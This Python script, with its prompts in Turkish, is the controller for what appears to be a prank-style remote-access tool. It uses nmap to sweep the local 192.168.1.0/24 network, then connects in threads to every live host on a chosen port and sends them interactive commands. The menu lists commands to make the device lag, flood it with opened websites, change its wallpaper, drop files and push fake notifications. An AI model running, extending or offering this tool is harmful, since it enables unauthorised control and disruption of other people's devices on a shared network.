import socket
import threading
import subprocess

def get_active_ips():
    print("[✓] Ağ taranıyor...")
    result = subprocess.check_output(["nmap", "-sn", "192.168.1.0/24"]).decode()
    lines = result.split("\n")
    ips = []
    for line in lines:
        if "Nmap scan report for" in line:
            ip = line.split()[-1]
            if ip.startswith("192.168.1.") and not ip.endswith(".1"):
                ips.append(ip)
    return ips

def client_handler(ip, port):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, port))
        print(f"\n[✓] Bağlantı başarılı: {ip}")

        cihaz = s.recv(1024).decode()
        print(f"[✓] Cihaz: {cihaz} ({ip})")

        print("""
[ Komutlar ]
1. google             → Google aç
2. saldiri            → Cihazı kasar
3. dosya              → saka.txt oluştur
4. arkaplan <url>     → Arka plan değiştir
5. saka <mesaj>       → Bildirim şakası gönder
6. flood              → Arka arkaya site açar
7. exit               → Bağlantıyı kapat
        """)

        while True:
            komut = input(f"Komut gönder [{ip}] >> ").strip()
            if not komut:
                continue
            s.send(komut.encode())
            if komut == "exit":
                print(f"[✓] Bağlantı kapatıldı: {ip}")
                s.close()
                break
            cevap = s.recv(2048).decode()
            print(f"[{ip}] {cevap}")

    except Exception as e:
        print(f"[!] {ip} bağlantı hatası: {e}")

if __name__ == "__main__":
    try:
        port = int(input("Port gir >> "))
        aktifler = get_active_ips()
        print(f"[✓] Aktif IP'ler: {aktifler}")

        for ip in aktifler:
            threading.Thread(target=client_handler, args=(ip, port)).start()

    except Exception as e:
        print(f"[!] Hata oluştu: {e}")
